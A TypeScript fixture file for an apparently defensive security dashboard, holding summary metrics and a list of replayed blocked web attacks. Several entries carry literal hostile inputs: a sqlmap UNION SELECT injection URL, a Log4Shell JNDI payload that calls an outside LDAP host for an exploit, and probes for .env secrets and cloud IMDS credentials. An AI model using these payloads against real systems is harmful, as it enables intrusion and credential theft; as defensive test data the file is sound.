/**
 * Aegis Sandbox Replay Dataset (Fixtures réelles anonymisées sur 24h)
 * Données extraites de sondes réelles de VPS de production, strictement anonymisées :
 * IPs masquées (ex: 185.220.xxx.xxx), FQDNs génériques, géolocalisation géographique réelle.
 */

import type { IngressEvent, EgressEvent } from '../services/api/streamsApi';
import type { ThreatEvent } from '../components/soc/cockpit/CockpitThreatLogsDrawer.vue';

export interface SandboxSummaryMetrics {
  traffic: {
    total_requests_24h: number;
    clean_traffic_pct: number;
    blocked_threats_total: number;
    compromised_bypass_total: number;
    ingress_total: number;
    ingress_blocked: number;
    ingress_bypassed: number;
    egress_total: number;
    egress_blocked: number;
    egress_bypassed: number;
    bot_probes_total: number;
    avg_latency_ms: number;
  };
  soc: {
    si_health_score: number;
    interception_rate_pct: number;
    c2_callbacks_blocked_total: number;
    monitored_nodes: Array<{
      id: string;
      hostname: string;
      ip: string;
      status: 'active' | 'warning' | 'offline';
      os: string;
      cpu_load_pct: number;
      ram_mb: number;
      rapl_watts: number;
      pep_enabled: boolean;
    }>;
  };
  green: {
    instant_power_watts: number;
    cpu_watts: number;
    ram_watts: number;
    carbon_intensity_gco2_h: number;
    eco_index_score: number;
    eco_index_grade: string;
    power_history: Array<{ timestamp: string; watts: number }>;
  };
  retention: {
    hot_window_days: number;
    anssi_forensic_days: number;
    rgpd_clean_ip_days: number;
  };
}

export const SANDBOX_INITIAL_METRICS: SandboxSummaryMetrics = {
  traffic: {
    total_requests_24h: 14820,
    clean_traffic_pct: 99.19,
    blocked_threats_total: 14712,
    compromised_bypass_total: 0,
    ingress_total: 13950,
    ingress_blocked: 13845,
    ingress_bypassed: 0,
    egress_total: 870,
    egress_blocked: 867,
    egress_bypassed: 0,
    bot_probes_total: 12480,
    avg_latency_ms: 1.18,
  },
  soc: {
    si_health_score: 99.4,
    interception_rate_pct: 99.98,
    c2_callbacks_blocked_total: 867,
    monitored_nodes: [
      {
        id: 'node-vps-paris-01',
        hostname: 'vps-gra-edge01.aegis.sovereign',
        ip: '51.83.xxx.xxx',
        status: 'active',
        os: 'Ubuntu 24.04 LTS (Kernel 6.8 RAPL)',
        cpu_load_pct: 3.2,
        ram_mb: 24,
        rapl_watts: 8.78,
        pep_enabled: true,
      },
      {
        id: 'node-k8s-ingress-02',
        hostname: 'k8s-worker-ns.cluster.local',
        ip: '10.244.1.42',
        status: 'active',
        os: 'Debian 12 Bookworm (Kepler eBPF)',
        cpu_load_pct: 4.8,
        ram_mb: 18,
        rapl_watts: 9.15,
        pep_enabled: true,
      },
    ],
  },
  green: {
    instant_power_watts: 8.84,
    cpu_watts: 6.12,
    ram_watts: 2.72,
    carbon_intensity_gco2_h: 0.48,
    eco_index_score: 92.4,
    eco_index_grade: 'A',
    power_history: [
      { timestamp: '00:00', watts: 8.42 },
      { timestamp: '02:00', watts: 8.35 },
      { timestamp: '04:00', watts: 8.28 },
      { timestamp: '06:00', watts: 8.51 },
      { timestamp: '08:00', watts: 8.92 },
      { timestamp: '10:00', watts: 9.15 },
      { timestamp: '12:00', watts: 9.04 },
      { timestamp: '14:00', watts: 8.96 },
      { timestamp: '16:00', watts: 8.88 },
      { timestamp: '18:00', watts: 8.94 },
      { timestamp: '20:00', watts: 8.82 },
      { timestamp: '22:00', watts: 8.65 },
    ],
  },
  retention: {
    hot_window_days: 30,
    anssi_forensic_days: 180,
    rgpd_clean_ip_days: 7,
  },
};

export interface ReplaySeedEvent {
  client_ip: string;
  method: string;
  target: string;
  host: string;
  user_agent: string;
  threat_type: string;
  category: string;
  decision: 'BLOCK' | 'ALLOW' | 'SINKHOLE';
  status_code: number;
  lat: number;
  lon: number;
  city: string;
  country: string;
  entropy: number;
  latency_ms: number;
}

export const REPLAY_ATTACK_SEEDS: ReplaySeedEvent[] = [
  {
    client_ip: '185.220.101.4',
    method: 'GET',
    target: '/wp-login.php',
    host: 'aegis.aivo.fr',
    user_agent: 'WPScan/3.8.22 (https://wpscan.com)',
    threat_type: 'CMS_PHP_BOT_PROBE',
    category: 'Sonde CMS Automatisée',
    decision: 'BLOCK',
    status_code: 403,
    lat: 52.3702,
    lon: 4.8952,
    city: 'Amsterdam',
    country: 'Pays-Bas',
    entropy: 3.42,
    latency_ms: 0.18,
  },
  {
    client_ip: '45.146.164.110',
    method: 'GET',
    target: '/.env',
    host: 'aegis.aivo.fr',
    user_agent: 'nuclei/v3.1.8',
    threat_type: 'PATH_TRAVERSAL_LFI',
    category: 'Exfiltration Clés Secrètes',
    decision: 'BLOCK',
    status_code: 403,
    lat: 55.7558,
    lon: 37.6173,
    city: 'Moscou',
    country: 'Russie',
    entropy: 2.65,
    latency_ms: 0.14,
  },
  {
    client_ip: '103.151.125.18',
    method: 'GET',
    target: '/api/v1/search?q=1%27%20UNION%20SELECT%20NULL,CONCAT(0x7170707171,user())--',
    host: 'aegis.aivo.fr',
    user_agent: 'sqlmap/1.7.11#stable (https://sqlmap.org)',
    threat_type: 'SQL_INJECTION',
    category: 'OWASP Top 10 SQLi',
    decision: 'BLOCK',
    status_code: 403,
    lat: 39.9042,
    lon: 116.4074,
    city: 'Pékin',
    country: 'Chine',
    entropy: 4.48,
    latency_ms: 0.22,
  },
  {
    client_ip: '89.248.163.142',
    method: 'POST',
    target: '/cgi-bin/test.cgi',
    host: 'aegis.aivo.fr',
    user_agent: 'curl/7.81.0',
    threat_type: 'COMMAND_INJECTION_RCE',
    category: 'Tentative Reverse Shell',
    decision: 'BLOCK',
    status_code: 403,
    lat: 51.5074,
    lon: -0.1278,
    city: 'Londres',
    country: 'Royaume-Uni',
    entropy: 4.62,
    latency_ms: 0.19,
  },
  {
    client_ip: '194.26.29.98',
    method: 'GET',
    target: '/api/v1/items?filter=${jndi:ldap://194.26.29.98:1389/Exploit}',
    host: 'aegis.aivo.fr',
    user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    threat_type: 'ZERO_DAY_VIRTUAL_PATCH',
    category: 'Exploit JNDI Log4Shell',
    decision: 'BLOCK',
    status_code: 403,
    lat: 50.1109,
    lon: 8.6821,
    city: 'Francfort',
    country: 'Allemagne',
    entropy: 4.71,
    latency_ms: 0.16,
  },
  {
    client_ip: '198.235.24.23',
    method: 'GET',
    target: '/dns-query?name=a8f93bc01d9f4e2a.xyz&type=A',
    host: 'egress.aegis.sovereign',
    user_agent: 'CoreDNS-Client/1.11',
    threat_type: 'DGA_EGRESS_SINKHOLE',
    category: 'C2 Egress Beaconing',
    decision: 'SINKHOLE',
    status_code: 0,
    lat: 37.7749,
    lon: -122.4194,
    city: 'San Francisco',
    country: 'États-Unis',
    entropy: 4.25,
    latency_ms: 0.12,
  },
  {
    client_ip: '91.240.118.242',
    method: 'GET',
    target: '/phpmyadmin/index.php',
    host: 'aegis.aivo.fr',
    user_agent: 'Masscan/1.3.2',
    threat_type: 'CMS_PHP_BOT_PROBE',
    category: 'Scanner de Ports & BDD',
    decision: 'BLOCK',
    status_code: 403,
    lat: 44.4268,
    lon: 26.1025,
    city: 'Bucarest',
    country: 'Roumanie',
    entropy: 3.12,
    latency_ms: 0.15,
  },
  {
    client_ip: '20.205.243.166',
    method: 'GET',
    target: '/latest/meta-data/iam/security-credentials/',
    host: 'aegis.aivo.fr',
    user_agent: 'Go-http-client/1.1',
    threat_type: 'SSRF_METADATA_PROBE',
    category: 'Sonde IMDS Cloud SSRF',
    decision: 'BLOCK',
    status_code: 403,
    lat: 1.3521,
    lon: 103.8198,
    city: 'Singapour',
    country: 'Singapour',
    entropy: 3.88,
    latency_ms: 0.17,
  },
  {
    client_ip: '162.158.158.42',
    method: 'GET',
    target: '/api/v1/metrics/green',
    host: 'aegis.aivo.fr',
    user_agent: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',
    threat_type: 'CLEAN_TRAFFIC',
    category: 'Consultation Publique',
    decision: 'ALLOW',
    status_code: 200,
    lat: 48.8566,
    lon: 2.3522,
    city: 'Paris',
    country: 'France',
    entropy: 2.34,
    latency_ms: 0.28,
  },
  {
    client_ip: '82.64.120.5',
    method: 'GET',
    target: '/api/v1/telemetry/rapl',
    host: 'aegis.aivo.fr',
    user_agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    threat_type: 'CLEAN_TRAFFIC',
    category: 'Télémétrie Silicium',
    decision: 'ALLOW',
    status_code: 200,
    lat: 45.7640,
    lon: 4.8357,
    city: 'Lyon',
    country: 'France',
    entropy: 2.45,
    latency_ms: 0.31,
  },
  {
    client_ip: '193.106.191.24',
    method: 'GET',
    target: '/wp-content/plugins/revslider/temp/update_extract/revslider.php',
    host: 'aegis.aivo.fr',
    user_agent: 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)',
    threat_type: 'SENSITIVE_FILE_PROBE',
    category: 'Sonde Exploit WordPress',
    decision: 'BLOCK',
    status_code: 403,
    lat: 59.9343,
    lon: 30.3351,
    city: 'Saint-Pétersbourg',
    country: 'Russie',
    entropy: 4.15,
    latency_ms: 0.16,
  },
  {
    client_ip: '141.98.11.89',
    method: 'POST',
    target: '/xmlrpc.php',
    host: 'aegis.aivo.fr',
    user_agent: 'python-requests/2.31.0',
    threat_type: 'CMS_PHP_BOT_PROBE',
    category: 'Amplification DDoS XMLRPC',
    decision: 'BLOCK',
    status_code: 403,
    lat: 47.3769,
    lon: 8.5417,
    city: 'Zurich',
    country: 'Suisse',
    entropy: 3.25,
    latency_ms: 0.14,
  },
];
